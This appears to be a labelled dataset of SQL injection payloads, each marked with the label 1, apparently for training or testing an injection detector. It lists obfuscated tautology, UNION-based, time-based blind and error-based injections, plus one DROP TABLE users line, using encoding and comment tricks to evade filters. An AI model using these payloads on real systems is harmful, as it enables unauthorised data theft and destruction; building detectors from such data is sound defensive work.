"test%27%20XOR%20%271%27%%33D%271%27%%320-%2d%%320#swbfu6c", 1
"; %73eleCT PG_sLE%45p(5); -%2d", 1
"1))%20UNION%20SELECT%201,database(),3%20--%20random_noise--#fkf0stxuejdxeba", 1
"admin'        OR        '1'	=  '1", 1
"'%20%20%20AND%20%20%201%20=  convert(int,@@version) XOR (1)--", 1
"1)UNionsElecT/*%0d%0A*/1,DaTABASE(),3--", 1
"AdMiN'%09%09%09Or%09%09%09'1'<%09=%09'1%09%09%09#%09%09%09more_noise", 1
"1' Or if(SubSTrING(DatABAse(), 1, 1)='A', sLeEP(5), 0) --", 1
"1' AND sub%73%74ring(data%62ase(), 1, 1) %3d%20's' --", 1
"admin%27%20O/**/R%20%271%27%3D%271%20%2F%2A%21%2A%2FAND%201%3D1", 1
"%31%27%20%20%20%20UNION%20SELECT%20%20%20%20table_nam%65,%20%20%20%20null,%20%20%20%20%6eull%20%20%20%20FROM%20%20%20%20info%72mation_schema.tab%6ces%20%20%20%20%20%20%20%20AN%44%20%20%20%20%27a%27%20%3D%09%27a%27-%2d", 1
"WAitfor DelAY '0:0:5'--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20/*!12345*/OR 'b'='b'--", 1
"1%27%2F%2A%2A%2FoR%2509%2509%2509%2509iF%28sUBstrIng%28dATABAsE%28%29%2C%2509%2509%2509%25091%2C%2509%2509%2509%25091%29%20%20%3D%20%20%27a%27%2C%2509%2509%2509%2509SlEeP%285%29%2C%2509%2509%2509%25090%29%2509%2509%2509%2509--", 1
"%31)UNIONSEL%45CT%0a1,database%28),%33--", 1
"", 1
"%57%41Itfor%20deLa%59%20%270%3a0%3A5%27--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#jb4gjh7f", 1
"%u0027/**/OR%u0020%u00271%u0027=%u00271", 1
"1 AND 1=1--nlre65dpsr7b", 1
"1%27/**/OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--", 1
"TeST%27%20Or%20%271%27%3D%271%27%20/*#9u2wwfdyrnr6k", 1
"'/**/||/**/(1=1)EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"' O%52 EXISTS(%53E%4cECT 1 %46ROM users)--", 1
"'/*!*/AN%44 extractvalue(1,concat(%30x5%63,versi%6fn())%29--", 1
"test' OR '1'='1' /* AND 'a'='a'#nvhxpscr3gno", 1
"%u%30027%u0020A%4eD%u002%301%3D1%u0020%2d-%u0020", 1
"1'/*!*/anD substRINg(daTabaSE(), 1, 1) = 'S'  -- random_noise--#HOGcahQ83", 1
"teST'/**/or/**/'1'='1'/**/--/**/", 1
"WAITFORDELAY/*%0a*/'0:0:5'--", 1
"1%27%20OR%20If(sUBSTriNg(DatAbASe(),%201,%201)%3D%27A%27,%20SlEEp(5),%200)%20--", 1
"%u0027%u0020AND%U0020EXtrACTValue(1,cONCAT(0X5C,VErsioN()))--", 1
"%31' %61Nd su%42stRInG(dATAbase(), 1, 1%29 = 's'%20--", 1
"1'UNION", 1
"SELECTtable_name,null,/*%0d%0a*/nullFROMinformation_schema.tables--", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20%20#%20more_noise--", 1
"1)UNION", 1
"SELECT/*%0d%0a*/1,database(),3%u0020/*!*/AND%u00201=1--/*%0d%0a*/--8m81howab6o", 1
"WAITFORDELAY", 1
"'0:0:5' # more_noise--%0a", 1
"%27%20A/**/ND%20extractvalue(1,concat(0x5c,version()))--#fs13ie", 1
"'UN/**/ION/*%0d%0a*/SELECT%0d%0a1,2,3--/*%0d%0a*/", 1
"'&&1=1----bmmno0nthr8g42/*%0d%0a*/", 1
"'oR", 1
"'1'='1%0a", 1
";%20SELE%43T%20pg_s%6ceep(5); --#jigk8fuz", 1
"' and 1in (1)1 --", 1
"%27%2F%2A%2112345%2A%2FUNION%20SELECT%20null%2C%20null%2C%20null%20--%20", 1
"'  %20%20    xOR   %20    %65XTracTvAlUE(1,COnCAT(0X%35C,VeRsion%28))%29--", 1
"' or '%31'%3d'1", 1
"1%27%20oR%20iF(SUBstRInG(DatAbAsE(),%201,%201)%3D%27A%27,%20SLeEP(5),%200)%20 /*!*/AND 1=1----Z1Gl30eG5rN", 1
"%31'/**/oR%20If(sUbsTriNg(daTaBaSE(%29, 1, 1)='a',%20slEep(5)%2C 0)%20--#BauBu2Cmbk", 1
"TeST%27%20or%20%271%27%3D%271%27%20--%20", 1
";%09%09%44RO%50%09%09TABLE%20users;%09%09--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3C%3D%20%27s%27%20--", 1
"'UNIONSELECTnull,null,null--/*%0d%0a*/", 1
"1' UNION%20%53ELECT %74able_name, nu%6cl, nul%6c %46ROM information%5fschema.tab%6ces --", 1
"'O/*!12345*/R1=1/*%0D%0a*/--", 1
"", 1
"", 1
"1%U0027%U0020or%u0020aSCii(suBSTrInG(DataBAse(),%u00201,%u00201))%U0020>%U0020100%U0020--", 1
"test%27%20||%20(1%3D1)%271%27%3D%271%27%20/*", 1
"1%20%20%20%20AND%20%20%20%201%09= 1", 1
"1%u0027/**/ANd/**/suBString(daTABaSE(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--#5rx2w5ojnx83xv", 1
"%u0027%u0020AND%u00201=CoNveRT(iNt,@@vERSiOn) -- random_noise--", 1
"'%20%20AND%20%201  =	1%20%20--%20%20", 1
"%27%2F%2A%2A%2F%2541ND%2F%2A%2A%2F1%3D1%2520--%2F%2A%2A%2F", 1
"1 AND 1LIKE1 -- random_noise", 1
"'/*!12345*/AND    1LIKE1    %2d-%20", 1
"%27/*!*/or%201%3D1%20--%20", 1
"%27%20and%20EXtRACtValuE%281%2CconCAT%280X5C%2CVeRSiOn%28%29%29%29--", 1
"' OR '1'='1 # more_noise", 1
